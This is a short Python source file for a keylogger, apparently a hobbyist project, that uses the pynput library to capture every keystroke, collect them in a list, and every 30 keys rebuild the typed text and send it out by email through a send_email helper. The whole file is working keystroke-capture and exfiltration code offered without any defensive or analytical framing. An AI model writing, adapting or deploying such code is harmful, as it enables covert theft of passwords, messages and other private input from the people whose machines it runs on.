# Import Required Libraries
# Important Library For a Keylogger
import pynput 
# Important Functions for Records keystorcks
from pynput.keyboard import Key, Listener 
import send_email

count = 0
# Create an Array for record all the keypress for send to email
keys = []

# Define the functions

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 30:
        count = 0
        email(keys)
        
# Function use for send the keys to email        
def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()